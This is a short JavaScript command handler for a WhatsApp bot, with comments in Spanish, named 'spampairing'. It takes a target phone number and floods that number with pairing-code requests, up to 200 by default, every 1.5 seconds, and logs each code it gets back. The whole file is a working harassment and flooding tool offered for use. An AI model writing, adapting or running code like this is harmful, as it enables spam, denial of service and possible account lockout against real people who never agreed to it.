let handler = async (m, { conn, text, command }) => {
  const botNumber = conn.user.id; // ID del bot (ej: 521234567890@s.whatsapp.net)
  if (m.sender !== botNumber) return m.reply('❌ Solo el bot puede ejecutar este comando.');

  if (!text) return m.reply(`📌 *Ejemplo:* ${command} +521234567890|150`);

  let [numeroRaw, repeticiones = "200"] = text.split("|");
  let target = numeroRaw.replace(/[^0-9]/g, '').trim();

  if (!target || target.length < 8) return m.reply('⚠️ Número inválido.');
  m.reply(`🚀 Iniciando spam de Pairing Code a: wa.me/${target}\n🔁 Repeticiones: ${repeticiones}`);

  const sleep = ms => new Promise(res => setTimeout(res, ms));

  for (let i = 0; i < Number(repeticiones); i++) {
    try {
      await sleep(1500);
      let code = await conn.requestPairingCode(target);
      console.log(`[SPAM ${i+1}] Pairing Code enviado a ${target}: ${code}`);
    } catch (e) {
      console.log(`[ERROR] Fallo en intento ${i+1}: ${e.message}`);
    }
  }

  await sleep(3000);
  m.reply('✅ Finalizado el spam de Pairing Code.');
};

handler.command = ['spampairing'];
handler.owner = false;
handler.premium = false;
handler.group = false;

export default handler;